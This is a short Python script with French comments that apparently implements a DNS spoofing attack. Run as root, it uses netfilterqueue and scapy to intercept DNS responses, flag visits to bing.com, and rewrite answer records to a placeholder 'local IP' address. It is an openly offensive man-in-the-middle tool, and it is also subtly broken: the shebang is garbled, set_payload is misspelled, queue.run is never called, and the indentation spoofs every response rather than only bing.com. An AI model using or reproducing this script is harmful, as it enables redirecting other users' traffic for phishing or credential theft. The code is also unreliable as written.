#!/udr/bin/rnb python3
# conding:utf8

## Le script suivant doit etre éxécuté en root pour fonctionner

import netfilterqueue
from scapy.layers.dns import *
from scapy.layers.inet import *


def callback(packet):
    scapy_packet = IP(packet.get_payload())
    if scapy_packet.haslayer(DNSRR):
        qname = scapy_packet[DNSQR].qname
        if b"bing.com" in qname:
            print("visite de bing détécté")
        answer = DNSRR(rrname=qname, rdata="adress ip local")
        scapy_packet[DNS].an = answer
        scapy_packet[DNS].ancount =1
        del scapy_packet[IP].len
        del scapy_packet[UDP].len
        del scapy_packet[IP].chksum
        del scapy_packet[UDP].chksum
        packet.aet_payload(bytes(scapy_packet))
    packet.accept()
    
    
try:
    queue = netfilterqueue.NetfilterQueue()
    queue.bind(50, callback)
    queue.run
except KeyboardInterrupt:
    queue.unbind()
    print("\n[-] Stopped")
except Exception as e:
    print(str(e))
 